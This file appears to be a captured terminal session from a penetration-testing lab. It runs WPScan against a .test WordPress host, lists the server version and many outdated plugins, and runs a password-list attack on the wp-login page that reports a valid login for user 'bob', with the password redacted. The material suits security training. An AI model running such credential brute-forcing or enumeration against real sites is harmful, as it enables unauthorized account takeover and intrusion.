@@ -1,0 +1,299 @@
+┌──(kali㉿kali)-[~]
+└─$ wpscan --url "https://www.armourinfosec.test" --disable-tls-checks --usernames bob --passwords ~/lab-passwords.txt --password-attack wp-login --max-threads 1
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: https://www.armourinfosec.test/ [192.168.198.136]
+[+] Started: Fri Jul 17 21:40:52 2026
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.3.14
+ |  - X-Powered-By: PHP/7.3.14
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: https://www.armourinfosec.test/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: https://www.armourinfosec.test/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: https://www.armourinfosec.test/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
+ | Found By: Rss Generator (Passive Detection)
+ |  - https://www.armourinfosec.test/?feed=rss2, <generator>https://wordpress.org/?v=5.3.2</generator>
+ | Confirmed By: Emoji Settings (Passive Detection)
+ |  - https://www.armourinfosec.test/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.3.2'
+
+[+] WordPress theme in use: rife-free
+ | Location: https://www.armourinfosec.test/wp-content/themes/rife-free/
+ | Last Updated: 2026-01-29T00:00:00.000Z
+ | Readme: https://www.armourinfosec.test/wp-content/themes/rife-free/readme.txt
+ | [!] The version is out of date, the latest version is 2.4.24
+ | Style URL: https://www.armourinfosec.test/wp-content/themes/rife-free/style.css?ver=2.4.5
+ | Style Name: Rife Free
+ | Style URI: https://apollo13themes.com/rife/free/
+ | Description: Rife Free is a great portfolio and photography WP theme with 7 ready-to-use demo layouts. It is also...
+ | Author: Apollo13Themes
+ | Author URI: https://apollo13themes.com/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.4.5 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://www.armourinfosec.test/wp-content/themes/rife-free/style.css?ver=2.4.5, Match: 'Version: 2.4.5'
+
+[+] Enumerating All Plugins (via Passive Methods)
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] ad-manager-wd
+ | Location: https://www.armourinfosec.test/wp-content/plugins/ad-manager-wd/
+ | Last Updated: 2019-12-18T11:08:00.000Z
+ | [!] The version is out of date, the latest version is 1.0.14
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.0.11 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/ad-manager-wd/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/ad-manager-wd/readme.txt
+
+[+] ajax-load-more
+ | Location: https://www.armourinfosec.test/wp-content/plugins/ajax-load-more/
+ | Last Updated: 2026-06-04T17:41:00.000Z
+ | [!] The version is out of date, the latest version is 8.0.0
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 2.8.0 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/ajax-load-more/README.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/ajax-load-more/README.txt
+
+[+] albo-pretorio-on-line
+ | Location: https://www.armourinfosec.test/wp-content/plugins/albo-pretorio-on-line/
+ | Last Updated: 2023-09-03T09:23:00.000Z
+ | [!] The version is out of date, the latest version is 4.6.6
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 3.2 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/albo-pretorio-on-line/readme.txt
+
+[+] audio-record
+ | Location: https://www.armourinfosec.test/wp-content/plugins/audio-record/
+ | Latest Version: 1.0
+ | Last Updated: 2017-05-10T07:10:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | The version could not be determined.
+
+[+] easy-modal
+ | Location: https://www.armourinfosec.test/wp-content/plugins/easy-modal/
+ | Last Updated: 2017-04-13T07:22:00.000Z
+ | [!] The version is out of date, the latest version is 2.1.0
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 2.0.17 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/easy-modal/readme.txt
+
+[+] elementor
+ | Location: https://www.armourinfosec.test/wp-content/plugins/elementor/
+ | Last Updated: 2026-07-14T14:33:00.000Z
+ | [!] The version is out of date, the latest version is 4.1.5
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 2.8.5 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/elementor/readme.txt
+ | Confirmed By: Javascript Comment (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/elementor/assets/js/admin-feedback.js, Match: 'elementor - v2.8.5'
+
+[+] gracemedia-media-player
+ | Location: https://www.armourinfosec.test/wp-content/plugins/gracemedia-media-player/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2013-07-21T15:09:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/gracemedia-media-player/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/gracemedia-media-player/readme.txt
+
+[+] mail-masta
+ | Location: https://www.armourinfosec.test/wp-content/plugins/mail-masta/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2014-09-19T07:52:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/mail-masta/readme.txt
+
+[+] photo-gallery
+ | Location: https://www.armourinfosec.test/wp-content/plugins/photo-gallery/
+ | Last Updated: 2026-05-29T16:36:00.000Z
+ | [!] The version is out of date, the latest version is 1.8.42
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.5.34 (100% confidence)
+ | Found By: Query Parameter (Passive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=1.5.34
+ |  - https://www.armourinfosec.test/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.5.34
+ |  - https://www.armourinfosec.test/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=1.5.34
+ |  - https://www.armourinfosec.test/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.5.34
+ | Confirmed By:
+ |  Readme - Stable Tag (Aggressive Detection)
+ |   - https://www.armourinfosec.test/wp-content/plugins/photo-gallery/readme.txt
+ |  Readme - ChangeLog Section (Aggressive Detection)
+ |   - https://www.armourinfosec.test/wp-content/plugins/photo-gallery/readme.txt
+
+[+] searchwp-live-ajax-search
+ | Location: https://www.armourinfosec.test/wp-content/plugins/searchwp-live-ajax-search/
+ | Last Updated: 2025-12-10T16:55:00.000Z
+ | [!] The version is out of date, the latest version is 1.8.7
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.4.4 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/searchwp-live-ajax-search/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/searchwp-live-ajax-search/readme.txt
+
+[+] spider-event-calendar
+ | Location: https://www.armourinfosec.test/wp-content/plugins/spider-event-calendar/
+ | Last Updated: 2021-12-07T14:18:00.000Z
+ | [!] The version is out of date, the latest version is 1.5.65
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.5.51 (100% confidence)
+ | Found By: Query Parameter (Passive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/spider-event-calendar/elements/calendar.js?ver=1.5.51
+ |  - https://www.armourinfosec.test/wp-content/plugins/spider-event-calendar/elements/calendar-setup.js?ver=1.5.51
+ |  - https://www.armourinfosec.test/wp-content/plugins/spider-event-calendar/elements/calendar_function.js?ver=1.5.51
+ |  - https://www.armourinfosec.test/wp-content/plugins/spider-event-calendar/elements/calendar-jos.css?ver=1.5.51
+ | Confirmed By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/spider-event-calendar/readme.txt
+
+[+] wp-google-places-review-slider
+ | Location: https://www.armourinfosec.test/wp-content/plugins/wp-google-places-review-slider/
+ | Last Updated: 2026-07-14T14:08:00.000Z
+ | [!] The version is out of date, the latest version is 18.4
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 6.1 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/wp-google-places-review-slider/README.txt
+
+[+] wp-jobs
+ | Location: https://www.armourinfosec.test/wp-content/plugins/wp-jobs/
+ | Last Updated: 2020-09-14T12:22:00.000Z
+ | [!] The version is out of date, the latest version is 2.3.1
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.4 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/wp-jobs/readme.txt
+
+[+] wp-responsive-thumbnail-slider
+ | Location: https://www.armourinfosec.test/wp-content/plugins/wp-responsive-thumbnail-slider/
+ | Last Updated: 2026-05-29T13:34:00.000Z
+ | [!] The version is out of date, the latest version is 1.1.14
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/wp-responsive-thumbnail-slider/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/wp-responsive-thumbnail-slider/readme.txt
+
+[+] wp-support-plus-responsive-ticket-system
+ | Location: https://www.armourinfosec.test/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+ | Last Updated: 2019-09-03T07:57:00.000Z
+ | [!] The version is out of date, the latest version is 9.1.2
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 7.1.3 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+
+[+] wp-with-spritz
+ | Location: https://www.armourinfosec.test/wp-content/plugins/wp-with-spritz/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2015-08-20T20:15:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 4.2.4 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://www.armourinfosec.test/wp-content/plugins/wp-with-spritz/readme.txt
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 <=============================================================================> (137 / 137) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - bob / [REDACTED]                                                                                                                                
+Trying bob / [REDACTED] Time: 00:00:00 <=====================================                                               > (5 / 11) 45.45%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: bob, Password: [REDACTED]
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri Jul 17 21:40:59 2026
+[+] Requests Done: 214
+[+] Cached Requests: 5
+[+] Data Sent: 67.415 KB
+[+] Data Received: 1.025 MB
+[+] Memory used: 258.277 MB
+[+] Elapsed time: 00:00:07
